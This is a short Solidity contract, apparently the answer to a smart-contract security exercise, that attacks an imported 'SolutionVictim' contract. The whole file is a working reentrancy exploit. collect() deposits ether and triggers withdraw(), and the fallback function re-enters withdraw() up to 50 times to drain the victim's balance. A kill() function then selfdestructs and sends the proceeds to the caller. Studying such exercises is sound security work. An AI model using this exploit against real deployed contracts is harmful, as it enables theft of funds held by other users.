pragma solidity ^0.4.18;

import './SolutionVictim.sol';

contract SolutionAttacker {

  SolutionVictim public solutionVictim;
  uint public count;

  event LogFallback(uint _count, uint _balance);

  function SolutionAttacker(address _victim) {
    solutionVictim = SolutionVictim(_victim);
  }

  function collect() payable {
    solutionVictim.deposit.value(msg.value)();
    solutionVictim.withdraw();
  }

  function kill() {
    selfdestruct(msg.sender);
  }

  function() payable {
    LogFallback(count, this.balance);
    count++;
    if (count < 50) {
      solutionVictim.withdraw();
    }
  }

}
